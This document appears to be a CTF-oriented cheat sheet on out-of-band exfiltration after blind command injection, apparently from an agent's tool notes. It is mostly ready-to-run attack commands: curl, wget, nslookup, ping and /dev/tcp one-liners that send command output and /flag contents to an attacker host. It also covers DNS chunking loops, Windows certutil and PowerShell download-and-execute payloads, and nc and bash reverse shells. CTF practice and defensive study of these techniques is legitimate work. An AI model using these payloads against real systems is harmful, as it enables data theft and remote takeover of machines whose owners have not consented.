# OOB Exfiltration — getting output out when nothing comes back

## The channel menu — ordered by reliability

| Channel | Egress needed | Payload shape | Speed |
|---|---|---|---|
| HTTP GET | outbound 80/443 | `curl http://YOU/$(id\|base64 -w0)` | fast, high-capacity |
| DNS query | outbound 53 | `nslookup $(id\|tr ' ' '.').YOU` | slow but survives HTTP-blocked egress |
| HTTPS POST | outbound 443 | `curl -d @/flag http://YOU/` | full file |
| ICMP ping | outbound ICMP | `ping -c1 $(id\|xxd -p).YOU` | tiny, survives some egress |
| SMTP | outbound 25 | `mail -s x YOU@host < /flag` | rare |
| SMB | outbound 445 | `copy x \\YOU\share\` (Windows) | Windows only |
| FTP | outbound 21 | `ftp`, `curl -T x ftp://YOU/` | rare |
| nc reverse | outbound any port | `nc YOU PORT -e sh` | full shell, most visible |
| /dev/tcp | bash | `exec 3<>/dev/tcp/YOU/P;id>&3` | no external tool needed |

## Setting up the listener

```bash
python3 tools/web/oob_listener.py serve --port 8000 --log hits.jsonl
python3 tools/web/oob_listener.py canary --base http://YOU:8000 --name x1
python3 tools/web/oob_listener.py hits --log hits.jsonl
```

`canary` prints a unique path per payload — correlates hits to payloads.
`hits` prints the JSONL — each line is the verbatim proof.

For DNS you need authoritative DNS for a domain you control or a
collaborator service (interactsh, burp collaborator, dnslog.cn,
requestbin-style). In CTF the org sometimes provides one — else the
timing channel stands in.

## HTTP exfil patterns

```sh
curl http://YOU/$(id|base64 -w0)
curl http://YOU/$(whoami)
wget -qO- http://YOU/$(hostname)
curl http://YOU/ -d "$(cat /flag | base64 -w0)"
curl --data-binary @/flag http://YOU/
```

`-w0` on base64 = no line wraps (line breaks break the URL).

## DNS exfil — survives strict HTTP egress

```sh
nslookup $(id|tr ' ' '.').attacker.tld
dig $(id|tr ' ' '.').attacker.tld
host $(whoami).attacker.tld
ping -c1 $(hostname).attacker.tld
```

Chunk rules: each DNS label ≤63 chars, total ≤253. Chunk long output:

```sh
d=$(cat /flag|base64 -w0);
for i in $(seq 0 60 ${#d});do
  nslookup ${d:$i:60}.YOU;
done
```

Spaces break names — `tr ' ' '.'` or base64/`xxd -p` encode first.

## ICMP exfil — survives locked-down egress

`ping -c1 $(data).YOU` — the data rides in the DNS lookup ping does.
Raw `ping` carrying data in the payload requires a crafted packet —
usually you abuse the DNS lookup ping does.

## `/dev/tcp` — bash built-in, no curl needed

```sh
exec 3<>/dev/tcp/YOU/80; echo -e "GET /$(id) HTTP/1.0\n">&3
id > /dev/tcp/YOU/80          # raw bytes to socket
cat /flag > /dev/tcp/YOU/80
```

bash-only (`sh`/`dash` lack `/dev/tcp`) — but works when curl/wget are
absent. `bash -c 'exec 3<>/dev/tcp/...'` wraps it for sh.

## Windows exfil

```cmd
certutil -urlcache -f http://YOU/x x
powershell -c "iwr http://YOU/$(hostname)"
curl http://YOU/%COMPUTERNAME%
nslookup %USERNAME%.YOU
```

PowerShell full exfil:

```powershell
powershell -ep bypass -c "iex (New-Object Net.WebClient).DownloadString('http://YOU/x')"
```

## The "egress is blocked" discovery — and the fallback

Test order:

```
1. ;curl http://YOU/ping            — direct http
2. ;nslookup x.YOU                  — dns only
3. ;ping -c1 x.YOU                  — icmp via dns
4. ;curl --dns-servers ... or use the app's own proxy param
```

If ALL egress is blocked, the options left: timing channel (slow),
error-oracle, file-drop into a fetchable path. `blind-cmdi.md`.

## The chain — OOB as the confirm when in-band fails

`oob` is evidence: the hit on YOUR listener is the verbatim proof the
command ran — record the listener's log line, not just "I sent it".

## The reverse-shell upgrade — last resort, not first

`nc -e`, `bash -i >& /dev/tcp/YOU/PORT 0>&1`, `python -c 'import
socket,pty...'` — reverse shells are post-confirm. For CTF the flag
read usually doesn't need a shell — `;cat /flag|curl -d @- YOU` is
enough.

## Falsifiers

- egress fully blocked on all protocols AND no DNS server answers
- no listener infrastructure available and timing also fails

## Output to record

- the verbatim hit line from `hits --log` as the proof
- which egress protocol worked
